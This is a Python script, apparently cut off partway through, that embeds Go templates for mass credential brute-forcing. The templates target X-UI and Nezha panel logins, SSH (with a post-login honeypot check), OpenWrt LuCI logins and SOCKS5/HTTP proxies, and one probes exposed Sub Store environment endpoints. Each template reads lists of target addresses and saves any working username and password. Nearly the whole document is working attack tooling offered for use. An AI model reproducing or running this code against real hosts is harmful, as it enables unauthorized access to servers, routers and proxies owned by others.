# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re

# ==================== 最终修复 ====================
# 强制要求使用 Python 3 运行，防止版本不匹配导致 'ModuleNotFoundError'
if sys.version_info[0] < 3:
    print("错误：此脚本需要 Python 3 运行。")
    print("请使用 'python3 xui.py' 命令来执行。")
    sys.exit(1)
# ================================================

# 依赖将在check_environment()中安装，这里仅做导入
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
except ImportError:
    # 留空，让环境检查函数处理依赖安装
    pass

try:
    import readline
except ImportError:
    pass

# =========================== xui.go模板1内容 (XUI面板) ===========================
XUI_GO_TEMPLATE_1 = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
	defer wg.Done()
	for line := range tasks {
		processIP(line, file, usernames, passwords)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	tr := &http.Transport{
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}
	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }

	for _, username := range usernames {
		for _, password := range passwords {
			var resp *http.Response
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkURL := fmt.Sprintf("http://%s:%s/login", ip, port)
			payload := fmt.Sprintf("username=%s&password=%s", username, password)
			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(payload))
			if err == nil {
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				resp, err = httpClient.Do(req)
			}
			cancel()

			if err != nil {
				if resp != nil { resp.Body.Close() }
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkURL = fmt.Sprintf("https://%s:%s/login", ip, port)
				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, err = httpClient.Do(req)
				}
				cancel2()
			}

			if err != nil {
				if resp != nil { resp.Body.Close() }
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				body, _ := io.ReadAll(resp.Body)
				var responseData map[string]interface{}
				if json.Unmarshal(body, &responseData) == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	go func() { http.ListenAndServe("localhost:6060", nil) }()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
	go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()

	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	usernames, passwords := {user_list}, {pass_list}
	if len(usernames) == 0 || len(passwords) == 0 {
		fmt.Println("错误：用户名或密码列表为空。")
		return
	}
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg, usernames, passwords)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
		for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" { tasks <- line }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== xui.go模板2内容 (哪吒面板) ===========================
XUI_GO_TEMPLATE_2 = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
	defer wg.Done()
	for line := range tasks {
		processIP(line, file, usernames, passwords)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	tr := &http.Transport{
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}
	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }

	for _, username := range usernames {
		for _, password := range passwords {
			var resp *http.Response
			data := map[string]string{"username": username, "password": password}
			jsonPayload, _ := json.Marshal(data)
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkURL := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(string(jsonPayload)))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
				resp, err = httpClient.Do(req)
			}
			cancel()

			if err != nil {
				if resp != nil { resp.Body.Close() }
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkURL = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(string(jsonPayload)))
				if err == nil {
					req.Header.Set("Content-Type", "application/json")
					resp, err = httpClient.Do(req)
				}
				cancel2()
			}

			if err != nil {
				if resp != nil { resp.Body.Close() }
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				body, _ := io.ReadAll(resp.Body)
				var responseData map[string]interface{}
				if json.Unmarshal(body, &responseData) == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	go func() { http.ListenAndServe("localhost:6060", nil) }()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()
	
	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	usernames, passwords := {user_list}, {pass_list}
    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg, usernames, passwords)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" { tasks <- line }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== xui.go模板6内容 (SSH) ===========================
XUI_GO_TEMPLATE_6 = '''package main

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"golang.org/x/crypto/ssh"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
	defer wg.Done()
	for line := range tasks {
		processIP(line, file, usernames, passwords)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])

	for _, username := range usernames {
		for _, password := range passwords {
			client, success, _ := trySSH(ip, port, username, password)
			if success {
				defer client.Close()
				if !isLikelyHoneypot(client) {
					file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
				}
				return
			}
		}
	}
}

func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
	addr := fmt.Sprintf("%s:%s", ip, port)
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, config)
    return client, err == nil, err
}

func isLikelyHoneypot(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil { return true }
	defer session.Close()
	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
	if err != nil { return true }
	output, err := session.CombinedOutput("echo $((1+1))")
	if err != nil { return true }
	return strings.TrimSpace(string(output)) != "2"
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()

	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	usernames, passwords := {user_list}, {pass_list}
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg, usernames, passwords)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" { tasks <- line }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== xui.go模板7内容 (Sub Store) ===========================
XUI_GO_TEMPLATE_7 = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {
	defer wg.Done()
	tr := &http.Transport{
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
	for line := range tasks {
		processIP(line, file, paths, client)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(line string, file *os.File, paths []string, client *http.Client) {
	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}
	for _, path := range paths {
		if tryBothProtocols(ipPort, path, client, file) { break }
	}
}

func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
	cleanPath := strings.Trim(path, "/")
	fullPath := cleanPath + "/api/utils/env"
	if success, _ := sendRequest(client, fmt.Sprintf("http://%s/%s", ipPort, fullPath)); success {
		file.WriteString(fmt.Sprintf("http://%s?api=http://%s/%s\\n", ipPort, ipPort, cleanPath))
		return true
	}
	if success, _ := sendRequest(client, fmt.Sprintf("https://%s/%s", ipPort, fullPath)); success {
		file.WriteString(fmt.Sprintf("https://%s?api=https://%s/%s\\n", ipPort, ipPort, cleanPath))
		return true
	}
	return false
}

func sendRequest(client *http.Client, fullURL string) (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil { return false, err }
	resp, err := client.Do(req)
	if err != nil { 
        if resp != nil { resp.Body.Close() }
        return false, err 
    }
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(bodyBytes), `{"status":"success","data"`) {
			return true, nil
		}
	}
	return false, nil
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	go func() { http.ListenAndServe("localhost:6060", nil) }()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()

	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	paths := {pass_list}
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg, paths)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" { tasks <- line }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== xui.go模板8内容 (OpenWrt) ===========================
XUI_GO_TEMPLATE_8 = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var completedCount int64
var isMemoryThrottled int32

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
	defer wg.Done()
	tr := &http.Transport{
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	for line := range tasks {
		processIP(line, file, usernames, passwords, client)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {
	targets := []string{}
	trimmed := strings.TrimSpace(line)
	if strings.HasPrefix(trimmed, "http") {
		targets = append(targets, trimmed)
	} else {
		targets = append(targets, "http://"+trimmed, "https://"+trimmed)
	}

	for _, target := range targets {
		u, err := url.Parse(target)
		if err != nil { continue }
		origin := u.Scheme + "://" + u.Host
		referer := origin + "/"
		for _, username := range usernames {
			for _, password := range passwords {
				if checkLogin(target, username, password, origin, referer, client) {
					file.WriteString(fmt.Sprintf("%s %s %s\\n", target, username, password))
					return
				}
			}
		}
	}
}

func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
	req, err := http.NewRequestWithContext(ctx, "POST", urlStr, strings.NewReader(payload))
	if err != nil { return false }
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	
	resp, err := client.Do(req)
	if err != nil { 
        if resp != nil { resp.Body.Close() }
        return false 
    }
	defer resp.Body.Close()
	for _, c := range resp.Cookies() {
		if c.Name == "sysauth_http" && c.Value != "" {
			return true
		}
	}
	return false
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./program <inputFile> <outputFile>")
		os.Exit(1)
	}
	inputFile, outputFile := os.Args[1], os.Args[2]
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\nGracefully shutting down...")
		os.Exit(0)
	}()
    go memoryMonitor()
	batch, err := os.Open(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	defer batch.Close()
	
	totalLines, _ := countLines(inputFile)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			current := atomic.LoadInt64(&completedCount)
			if totalLines > 0 {
				percentage := float64(current) / float64(totalLines) * 100
				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) ", bar, percentage, current, totalLines)
			}
			if current >= int64(totalLines) {
				fmt.Fprintf(os.Stdout, "\\n")
				return
			}
			<-ticker.C
		}
	}()

	usernames, passwords := {user_list}, {pass_list}
	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outFile.Close()
	tasks := make(chan string, {semaphore_size})
	var wg sync.WaitGroup
	for i := 0; i < {semaphore_size}; i++ {
		wg.Add(1)
		go worker(tasks, outFile, &wg, usernames, passwords)
	}
	scanner := bufio.NewScanner(batch)
	for scanner.Scan() {
        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
		line := strings.TrimSpace(scanner.Text())
		if line != "" { tasks <- line }
	}
	close(tasks)
	wg.Wait()
}
'''
# =========================== PROXY_GO_TEMPLATE (SOCKS5, HTTP, HTTPS代理) ===========================
PROXY_GO_TEMPLATE = '''package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

var (
	proxyType    = "{proxy_type}"
	authMode     = {auth_mode}
	testURL      = "http://myip.ipip.net"
	realIP       = ""
	completedCount int64
    isMemoryThrottled int32
)

func countLines(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil { return 0, err }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() { count++ }
	return count, scanner.Err()
}

func memoryMonitor() {
	var baselineMem uint64
	var m runtime.MemStats
	time.Sleep(2 * time.Second)
	runtime.ReadMemStats(&m)
	baselineMem = m.Sys
	highWatermark := baselineMem + 200*1024*1024
	lowWatermark := baselineMem + 100*1024*1024
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		runtime.ReadMemStats(&m)
		if m.Sys >= highWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 1)
		} else if m.Sys < lowWatermark {
			atomic.StoreInt32(&isMemoryThrottled, 0)
		}
	}
}

func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
	defer wg.Done()
	for proxyAddr := range tasks {
		processProxy(proxyAddr, outputFile)
		atomic.AddInt64(&completedCount, 1)
	}
}

func processProxy(proxyAddr string, outputFile *os.File) {
	timeout := {timeout} * time.Second
	var found bool

	checkAndFormat := func(auth *proxy.Auth) {
        if found { return }
		success, _ := checkConnection(proxyAddr, auth, timeout)
		if success {
            found = true
			var result string
			if auth != nil && auth.User != "" {
				result = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
			} else {
				result = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
			}
			outputFile.WriteString(result + "\\n")
		}
	}

	switch authMode {
	case 1: // No auth
		checkAndFormat(nil)
	case 2: // User/Pass files
		usernames := {user_list}
		passwords := {pass_list}
		for _, user := range usernames {
			for _, pass := range passwords {
				if found { return }
				auth := &proxy.Auth{User: user, Password: pass}
				checkAndFormat(auth)
			}
		}
	case 3: // Credentials file
		credentials := {creds_list}
		for _, cred := range credentials {
			if found { return }
			parts := strings.SplitN(cred, ":", 2)
			if len(parts) == 2 {
				auth := &proxy.Auth{User: parts[0], Password: parts[1]}
				checkAndFormat(auth)
			}
		}
	}
}

func getPublicIP(targetURL string) (string, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil { return "", err }
	req.Header.Set("User-Agent", "curl/7.79.1")
	resp, err := client.Do(req)
	if err != nil { return "", err }
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { return "", err }
	ipString := string(body)
	if strings.Contains(ipString, "当前 IP：") {
		parts := strings.Split(ipString, "：")
		if len(parts) > 1 {
			ipParts := strings.Split(parts[1], " ")
			return ipParts[0], nil
		}
	}
	return strings.TrimSpace(ipString), nil
}

func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) (bool, error) {
	transport := &http.Transport{ 
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}

	if proxyType == "http" || proxyType == "https" {
		var proxyURLString string
		if auth != nil && auth.User != "" {
			proxyURLString = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
		} else {
			proxyURLString = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
		}
		proxyURL, err := url.Parse(proxyURLString)
		if err != nil { return false, err }
		transport.Proxy = http.ProxyURL(proxyURL)
	} else { // socks5
		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
			Timeout:   timeout,
			KeepAlive: 30 * time.Second,
		})
		if err != nil { return false, err }
		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		}
	}

	httpClient := &http.Client{ Transport: transport, Timeout:   timeout }
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil { return false, err }
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
	resp, err := httpClient.Do(req)
	if err != nil { 
